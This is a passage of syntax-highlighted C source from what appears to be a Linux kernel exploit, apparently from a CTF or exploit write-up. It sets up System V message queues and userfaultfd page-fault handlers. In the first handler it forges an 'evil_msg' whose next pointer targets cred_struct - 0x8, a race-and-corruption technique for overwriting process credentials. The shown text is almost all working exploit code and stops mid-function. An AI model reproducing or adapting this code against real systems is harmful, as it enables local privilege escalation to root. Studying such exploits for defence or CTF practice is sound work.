</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">__pause</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Paused - </span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">getchar</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">hexdump</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buff</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i,j;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; size/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((i % </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(i != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;  </span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;  </span><span style="color:#d08770;">%04x  </span><span style="color:#c0c5ce;">&quot;, i*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">0x</span><span style="color:#d08770;">%016lx</span><span style="color:#c0c5ce;">&quot;, ((uint64_t *)(buff))[i]);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;    &quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">putchar</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">qid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">c</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msgbuf
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mtype;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> mtext[size - </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    } msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    msg.</span><span style="color:#bf616a;">mtype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">, c, sizeof(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid, &amp;msg, sizeof(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsnd</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">recv_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">qid</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*memdump = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(size);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid, memdump, size, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgrcv</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> memdump;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">userfaultfd</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(SYS_userfaultfd, flags);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">initialize_ufd</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">page</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_register reg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((fd = </span><span style="color:#8fa1b3;">userfaultfd</span><span style="color:#c0c5ce;">(O_NONBLOCK)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Userfaultfd failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((ufd_qid = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_api api = { .</span><span style="color:#bf616a;">api </span><span style="color:#c0c5ce;">= UFFD_API };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, UFFDIO_API, &amp;api))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] ioctl - UFFDIO_API failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(api.</span><span style="color:#bf616a;">api </span><span style="color:#c0c5ce;">!= UFFD_API)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Unexepcted UFFD api version!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Start monitoring range: </span><span style="color:#d08770;">%p</span><span style="color:#a3be8c;"> - </span><span style="color:#d08770;">%p</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page + PAGE_SIZE, page + PAGE_SIZE*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    reg.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= UFFDIO_REGISTER_MODE_MISSING;
</span><span style="color:#c0c5ce;">    reg.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">start </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">)(page + PAGE_SIZE);
</span><span style="color:#c0c5ce;">    reg.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, UFFDIO_REGISTER,  &amp;reg))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] ioctl - UFFDIO_REGISTER failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> fd;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">page_fault_handler_1</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">_ufd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pollfd pollfd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffd_msg fault_msg;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_copy ufd_copy;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_range ufd_range;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pid_t pid;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ufd = *((</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">*)_ufd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pollfd.</span><span style="color:#bf616a;">fd </span><span style="color:#c0c5ce;">= ufd;
</span><span style="color:#c0c5ce;">    pollfd.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">= POLLIN;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Started!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">(&amp;pollfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((pollfd.</span><span style="color:#bf616a;">revents </span><span style="color:#c0c5ce;">&amp; POLLERR) || (pollfd.</span><span style="color:#bf616a;">revents </span><span style="color:#c0c5ce;">&amp; POLLHUP))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Polling failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(ufd, &amp;fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Read - fault_msg failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*page_fault_location = (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)fault_msg.</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">pagefault</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">address</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fault_msg.</span><span style="color:#bf616a;">event </span><span style="color:#c0c5ce;">!= UFFD_EVENT_PAGEFAULT)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Unexpected pagefault?</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page_fault_location == page_1 + PAGE_SIZE)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Page fault at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_fault_location);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buff, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Releasing faulting thread</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *msg = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *)(buff + </span><span style="color:#d08770;">0x1000 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            msg-&gt;m_type =  </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            msg-&gt;m_ts = </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            msg-&gt;next = (uint64_t)(cred_struct - </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)(page_fault_location);
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)(&amp;buff);
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(;;)
</span><span style="color:#c0c5ce;">            {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(release_pfh_1)
</span><span style="color:#c0c5ce;">                {
</span><span style="color:#c0c5ce;">                    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(ufd, UFFDIO_COPY, &amp;ufd_copy) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                    {
</span><span style="color:#c0c5ce;">                        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ioctl(UFFDIO_COPY)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Faulting thread released</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                    </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">page_fault_handler_2</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">_ufd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pollfd pollfd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffd_msg fault_msg;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_copy ufd_copy;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_range ufd_range;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pid_t pid;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ufd = *((</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">*)_ufd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pollfd.</span><span style="color:#bf616a;">fd </span><span style="color:#c0c5ce;">= ufd;
</span><span style="color:#c0c5ce;">    pollfd.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">= POLLIN;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 2] Started!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">(&amp;pollfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((pollfd.</span><span style="color:#bf616a;">revents </span><span style="color:#c0c5ce;">&amp; POLLERR) || (pollfd.</span><span style="color:#bf616a;">revents </span><span style="color:#c0c5ce;">&amp; POLLHUP))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Polling failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(ufd, &amp;fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Read - fault_msg failed</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*page_fault_location = (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)fault_msg.</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">pagefault</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">address</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fault_msg.</span><span style="color:#bf616a;">event </span><span style="color:#c0c5ce;">!= UFFD_EVENT_PAGEFAULT)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[ERROR] Unexpected pagefault?</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page_fault_location == page_2 + PAGE_SIZE)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 2] Page fault at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_fault_location);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buff2, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            release_pfh_1 = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
